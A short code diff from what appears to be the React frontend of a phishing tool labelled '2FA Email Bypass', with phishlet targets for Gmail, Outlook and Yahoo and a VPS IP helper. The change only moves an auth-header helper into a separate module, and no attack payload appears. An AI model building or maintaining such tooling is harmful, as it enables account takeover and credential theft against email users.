@@ -4,15 +4,11 @@ import Sidebar from "./Sidebar";
 import TerminalOutput from "./TerminalOutput";
 import useAsyncAction from "../hooks/useAsyncAction";
 import { getVpsIp } from "../hooks/phishletUrl";
+import authHeaders from "../utils/authHeaders";
 
 const VPS_IP = getVpsIp();
 const BASE = import.meta.env.VITE_API_URL || "";
 const APP_NAME = import.meta.env.VITE_APP_NAME || "2FA Email Bypass";
-
-function authHeaders() {
-  const token = localStorage.getItem("btb_token");
-  return token ? { Authorization: `Bearer ${token}` } : {};
-}
 
 const PHISHLET_KEYS = ["gmail", "outlook", "yahoo"];
 
